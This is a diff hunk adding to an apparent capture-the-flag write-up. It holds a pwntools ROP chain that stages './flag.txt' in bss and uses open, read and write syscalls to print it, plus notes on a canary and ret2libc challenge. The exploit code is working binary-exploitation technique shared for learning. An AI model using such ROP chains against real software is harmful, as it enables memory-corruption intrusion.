@@ -296,6 +296,68 @@ or! i use ORW:
 2. read() to buffer 
 3. write to stdout whats there 
 
+the ROP chain would look something like this, ive tested it locally but i dunno about remotely
+
+does what the above statements say ^^
+
+```python
+# open read write ROP
+# step 1: write flag.txt to bss memory
+# 00000000004688c3: mov qword ptr [rdi], rdx; ret;
+# pop rbx doesnt matter, just pad w 0
+thegadget = 0x4688C3
+payload2 = flat(
+    pop_rdi_ret,
+    elf.bss() + 0x800,
+    pop_rdx_rbx_ret,
+    u64(b"./flag.t"),
+    0,
+    thegadget,
+    # part 2, qwords are 8 bytes so remaining 2 + 6 null
+    pop_rdi_ret,
+    elf.bss() + 0x808,
+    pop_rdx_rbx_ret,
+    u64(b"xt\x00\x00\x00\x00\x00\x00"),
+    0,
+    thegadget,
+    # ok, now bss region has flag, open()
+    pop_rax_ret,
+    2,
+    pop_rdi_ret,
+    elf.bss() + 0x800,
+    pop_rsi_ret,
+    0,
+    pop_rdx_rbx_ret,
+    0,
+    0,
+    syscall,
+    # read()
+    pop_rax_ret,
+    0,
+    pop_rdi_ret,
+    3,
+    pop_rsi_ret,
+    elf.bss() + 0x900,
+    pop_rdx_rbx_ret,
+    64,
+    0,
+    syscall,
+    # write()
+    pop_rax_ret,
+    1,
+    pop_rdi_ret,
+    1,
+    pop_rsi_ret,
+    elf.bss() + 0x900,
+    pop_rdx_rbx_ret,
+    64,
+    0,
+    syscall,
+)
+
+
+```
+
 ### finals: cage
 * this is literally just stack canary + ret2libc, with another format string leak! 
 * one thing i learned was how to use pwndbg to kind of figure out the position of stuff. so you firstly break at printf, then check the slots down in telescope until it shows your canary
